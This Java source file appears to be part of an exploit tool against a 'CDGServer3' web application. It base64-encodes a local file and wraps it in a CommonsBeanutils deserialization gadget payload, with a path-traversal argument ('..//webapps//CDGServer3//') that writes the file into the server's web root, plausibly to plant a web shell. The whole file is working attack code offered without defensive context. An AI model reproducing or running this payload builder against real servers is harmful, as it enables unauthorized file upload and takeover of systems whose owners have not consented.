package com.cdg;

import com.cdg.yso.payloads.CommonsBeanutils2;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Encode {
    public static String encoder(String filePath) {
        try {
            //String filePath = "/Users/admin/Downloads/CDGDEcodeXML-main/out/artifacts
            File file = new File(filePath);
            String fileName = file.getName();

            String fileContent = new String(Files.readAllBytes(Paths.get(fileName)));
            String encodedString =
                    Base64.getEncoder().withoutPadding().encodeToString(fileContent.getBytes());

            String[] args = {"upload_file_base64:..//webapps//CDGServer3//"+ fileName + "|" + encodedString};

            String s1 = CommonsBeanutils2.main(args);

            String result = ServiceUtil.changeXMLInfo(s1);
//            System.out.println(result);
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return filePath;
    }
}
